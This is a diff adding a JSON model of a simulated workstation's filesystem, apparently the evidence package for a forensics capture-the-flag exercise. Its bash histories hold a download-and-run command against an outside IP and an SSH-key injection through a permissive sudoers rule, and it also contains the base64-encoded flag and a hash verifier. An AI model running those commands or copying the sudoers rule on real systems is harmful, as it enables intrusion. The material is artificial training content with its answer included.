@@ -1,0 +1,277 @@
+{
+  "host": "SHIELD-WKS-006",
+  "user": "agent006",
+  "home": "/home/agent006",
+  "nodes": {
+    "/": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 23:30",
+      "size": 4096
+    },
+    "/etc": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 23:30",
+      "size": 4096
+    },
+    "/etc/sudoers.d": {
+      "type": "dir",
+      "mode": "drwxr-x---",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 22:14",
+      "size": 4096
+    },
+    "/home": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 23:30",
+      "size": 4096
+    },
+    "/home/agent006": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "agent006",
+      "group": "agent006",
+      "mtime": "Oct 24 23:55",
+      "size": 4096
+    },
+    "/home/agent006/.shield": {
+      "type": "dir",
+      "mode": "drwxr-x---",
+      "owner": "agent006",
+      "group": "agent006",
+      "mtime": "Oct 24 23:45",
+      "size": 4096
+    },
+    "/home/svc_archive": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "svc_archive",
+      "group": "svc_archive",
+      "mtime": "Oct 24 23:42",
+      "size": 4096
+    },
+    "/opt": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 21:02",
+      "size": 4096
+    },
+    "/opt/shield": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 21:02",
+      "size": 4096
+    },
+    "/opt/shield/scripts": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 21:02",
+      "size": 4096
+    },
+    "/root": {
+      "type": "dir",
+      "mode": "drwx------",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 20:00",
+      "size": 4096
+    },
+    "/tmp": {
+      "type": "dir",
+      "mode": "drwxrwxrwt",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 23:41",
+      "size": 4096
+    },
+    "/usr": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 20:00",
+      "size": 4096
+    },
+    "/usr/local": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 20:00",
+      "size": 4096
+    },
+    "/usr/local/bin": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 21:10",
+      "size": 4096
+    },
+    "/var": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 20:00",
+      "size": 4096
+    },
+    "/var/log": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 23:47",
+      "size": 4096
+    },
+    "/var/tmp": {
+      "type": "dir",
+      "mode": "drwxrwxrwt",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 23:44",
+      "size": 4096
+    },
+    "/var/tmp/.stage": {
+      "type": "dir",
+      "mode": "drwxr-xr-x",
+      "owner": "agent006",
+      "group": "agent006",
+      "mtime": "Oct 24 23:44",
+      "size": 4096
+    },
+    "/etc/motd": {
+      "type": "file",
+      "mode": "-rw-r--r--",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 21:00",
+      "size": 195,
+      "content": "\nSHIELD // SECURE EVIDENCE PACKAGE\n\nCASE: 006-17\nHOST: SHIELD-WKS-006\n\n[+] Authentication logs\n[+] Shell history\n[+] Hidden files\n[+] System artifacts\n\nEvidence loaded.\n\nFind out what happened.\n\n"
+    },
+    "/etc/passwd": {
+      "type": "file",
+      "mode": "-rw-r--r--",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 21:02",
+      "size": 1432,
+      "content": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nagent006:x:1001:1001:Agent 006 (SHIELD Workstation):/home/agent006:/bin/bash\nsvc_archive:x:1002:1002:SHIELD Archive Sync Service:/home/svc_archive:/bin/bash\n"
+    },
+    "/etc/sudoers.d/svc_archive": {
+      "type": "file",
+      "mode": "-r--r-----",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 22:14",
+      "size": 154,
+      "content": "# SHIELD Archival Synchronization Automation\nsvc_archive ALL=(ALL) NOPASSWD: /opt/shield/scripts/sync_archive.sh\nsvc_archive ALL=(agent006) NOPASSWD: ALL\n"
+    },
+    "/home/agent006/.bashrc": {
+      "type": "file",
+      "mode": "-rw-r--r--",
+      "owner": "agent006",
+      "group": "agent006",
+      "mtime": "Oct 24 08:30",
+      "size": 252,
+      "content": "# ~/.bashrc for agent006@SHIELD-WKS-006\nif [ -f /etc/motd ]; then\n    cat /etc/motd\nfi\n\nexport PS1='\\[\\033[01;32m\\]agent006@SHIELD-WKS-006\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\nexport PATH=\"/usr/local/bin:/usr/bin:/bin:$PATH\"\nalias ll='ls -la'\n"
+    },
+    "/home/agent006/.bash_history": {
+      "type": "file",
+      "mode": "-rw-------",
+      "owner": "agent006",
+      "group": "agent006",
+      "mtime": "Oct 24 23:50",
+      "size": 115,
+      "content": "ls -la\nw\nuname -a\ncat /etc/os-release\ndf -h\nwget http://10.13.37.91/update\nchmod +x update\n./update\nrm update\nexit\n"
+    },
+    "/home/agent006/.shield/.trace": {
+      "type": "file",
+      "mode": "-rw-r-----",
+      "owner": "agent006",
+      "group": "agent006",
+      "mtime": "Oct 24 23:45",
+      "size": 61,
+      "content": "23:43:17 — REMOTE LOGIN\nUSER: agent006\nSOURCE: 10.13.37.91\n"
+    },
+    "/home/svc_archive/.bash_history": {
+      "type": "file",
+      "mode": "-rw-r--r--",
+      "owner": "svc_archive",
+      "group": "svc_archive",
+      "mtime": "Oct 24 23:42",
+      "size": 239,
+      "content": "/opt/shield/scripts/sync_archive.sh --source node-17 --target /var/archive/data\ncrontab -l\nsudo -u agent006 /usr/bin/id\nsudo -u agent006 bash -c 'cat >> /home/agent006/.ssh/authorized_keys' < /tmp/.key_staging\nrm -f /tmp/.key_staging\nexit\n"
+    },
+    "/home/svc_archive/.doorway": {
+      "type": "file",
+      "mode": "-rw-r--r--",
+      "owner": "svc_archive",
+      "group": "svc_archive",
+      "mtime": "Oct 24 23:41",
+      "size": 37,
+      "encoding": "base64",
+      "content": "U0hJRUxEe3kwdXJfbTRjaDFuM193NHNfdGgzX2QwMHJ3NHl9Cg=="
+    },
+    "/opt/shield/scripts/sync_archive.sh": {
+      "type": "file",
+      "mode": "-rwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 21:02",
+      "size": 182,
+      "content": "#!/bin/bash\n# SHIELD Automated Archival Synchronization Daemon script\n# Owner: svc_archive\n# Node: ARCHIVE-17\necho \"[$(date)] Starting sync for Node-17\"\n# Legacy sync routine\nexit 0\n"
+    },
+    "/usr/local/bin/submit_flag": {
+      "type": "file",
+      "mode": "-rwxr-xr-x",
+      "owner": "root",
+      "group": "root",
+      "mtime": "Oct 24 21:10",
+      "size": 845,
+      "content": "#!/usr/bin/env python3\n\"\"\"SHIELD // evidence token verification shim.\n\nChecks a candidate token against the case digest. The token itself is not\nstored here -- a verifier that carries the answer is not a verifier.\n\"\"\"\nimport hashlib\nimport sys\n\nCASE = \"006-17\"\nDIGEST = \"07af9a68cbf30e52f54b3ada87899575b0dd98226a40d9c31f28b2165860db06\"\n\n\ndef main():\n    if len(sys.argv) > 1:\n        candidate = sys.argv[1].strip()\n    else:\n        candidate = input(\"[?] Enter token to verify: \").strip()\n\n    if hashlib.sha256(candidate.encode()).hexdigest() == DIGEST:\n        print(\"[+] Token verified against case \" + CASE + \".\")\n        print(\"[+] File it with SHIELD command to close the case.\")\n        sys.exit(0)\n\n    print(\"[-] Verification failed: invalid token. Re-examine your evidence.\")\n    sys.exit(1)\n\n\nif __name__ == \"__main__\":\n    main()\n"
+    },
+    "/var/log/auth.log": {
+      "type": "file",
+      "mode": "-rw-r-----",
+      "owner": "root",
+      "group": "adm",
+      "mtime": "Oct 24 23:47",
+      "size": 2254,
+      "content": "Oct 24 06:25:01 SHIELD-WKS-006 CRON[11042]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)\nOct 24 06:25:01 SHIELD-WKS-006 CRON[11042]: pam_unix(cron:session): session closed for user root\nOct 24 08:30:11 SHIELD-WKS-006 systemd-logind[412]: New session 1 of user agent006.\nOct 24 08:30:12 SHIELD-WKS-006 lightdm: pam_unix(lightdm:session): session opened for user agent006(uid=1001) by (uid=0)\nOct 24 17:15:40 SHIELD-WKS-006 lightdm: pam_unix(lightdm:session): session closed for user agent006\nOct 24 22:00:01 SHIELD-WKS-006 CRON[13501]: pam_unix(cron:session): session opened for user svc_archive(uid=1002) by (uid=0)\nOct 24 22:00:05 SHIELD-WKS-006 CRON[13501]: pam_unix(cron:session): session closed for user svc_archive\nOct 24 23:38:12 SHIELD-WKS-006 sshd[14100]: Server listening on 0.0.0.0 port 22.\nOct 24 23:40:02 SHIELD-WKS-006 sudo[14105]: svc_archive : TTY=unknown ; PWD=/opt/shield/archive ; USER=agent006 ; COMMAND=/usr/bin/id\nOct 24 23:40:02 SHIELD-WKS-006 sudo[14105]: pam_unix(sudo:session): session opened for user agent006(uid=1001) by (uid=0)\nOct 24 23:40:02 SHIELD-WKS-006 sudo[14105]: pam_unix(sudo:session): session closed for user agent006\nOct 24 23:40:19 SHIELD-WKS-006 sudo[14112]: svc_archive : TTY=unknown ; PWD=/opt/shield/archive ; USER=agent006 ; COMMAND=/bin/bash -c cat >> /home/agent006/.ssh/authorized_keys\nOct 24 23:40:19 SHIELD-WKS-006 sudo[14112]: pam_unix(sudo:session): session opened for user agent006(uid=1001) by (uid=0)\nOct 24 23:40:19 SHIELD-WKS-006 sudo[14112]: pam_unix(sudo:session): session closed for user agent006\nOct 24 23:43:12 SHIELD-WKS-006 sshd[14201]: Connection from 10.13.37.91 port 48192 on 10.0.0.6 port 22 rdomain \"\"\nOct 24 23:43:15 SHIELD-WKS-006 sshd[14201]: Accepted publickey for agent006 from 10.13.37.91 port 48192 ssh2: RSA SHA256:7mGfO...\nOct 24 23:43:15 SHIELD-WKS-006 sshd[14201]: pam_unix(sshd:session): session opened for user agent006(uid=1001) by (uid=0)\nOct 24 23:43:17 SHIELD-WKS-006 systemd-logind[412]: New session 42 of user agent006.\nOct 24 23:47:04 SHIELD-WKS-006 sshd[14201]: Received disconnect from 10.13.37.91 port 48192:11: disconnected by user\nOct 24 23:47:04 SHIELD-WKS-006 sshd[14201]: pam_unix(sshd:session): session closed for user agent006\n"
+    },
+    "/var/log/syslog": {
+      "type": "file",
+      "mode": "-rw-r-----",
+      "owner": "root",
+      "group": "adm",
+      "mtime": "Oct 24 23:47",
+      "size": 1115,
+      "content": "Oct 24 23:35:00 SHIELD-WKS-006 systemd[1]: Starting SHIELD Archive Telemetry Sync...\nOct 24 23:35:01 SHIELD-WKS-006 sync_archive[14012]: Initiating hourly archive pull from Node-17.\nOct 24 23:35:05 SHIELD-WKS-006 sync_archive[14012]: Archive pull completed. Status: SYNCHRONIZED.\nOct 24 23:40:01 SHIELD-WKS-006 CRON[14101]: (svc_archive) CMD (/opt/shield/scripts/sync_archive.sh)\nOct 24 23:42:10 SHIELD-WKS-006 kernel: [142981.120914] [UFW BLOCK] IN=eth0 OUT= MAC=02:42:0a:00:00:06:02:42:ac:11:00:02:08:00 SRC=192.168.1.99 DST=10.0.0.6 LEN=40 TOS=0x00 PREC=0x00 TTL=243 ID=54321 PROTO=TCP SPT=55122 DPT=445 WINDOW=1024 RES=0x00 SYN URGP=0\nOct 24 23:43:12 SHIELD-WKS-006 sshd[14201]: Accepted publickey for agent006 from 10.13.37.91 port 48192 ssh2\nOct 24 23:43:17 SHIELD-WKS-006 systemd-logind[412]: New session 42 of user agent006.\nOct 24 23:44:02 SHIELD-WKS-006 systemd[1]: update.service: Transient process spawned by user agent006 (PID: 14250).\nOct 24 23:45:10 SHIELD-WKS-006 systemd[1]: update.service: Process terminated with code 0.\nOct 24 23:47:04 SHIELD-WKS-006 systemd-logind[412]: Session 42 logged out.\n"
+    },
+    "/var/tmp/.stage/.note": {
+      "type": "file",
+      "mode": "-rw-r--r--",
+      "owner": "agent006",
+      "group": "agent006",
+      "mtime": "Oct 24 23:44",
+      "size": 76,
+      "content": "The machine was never the target.\n\nIt was the doorway.\n\nFind who opened it.\n"
+    }
+  }
+}
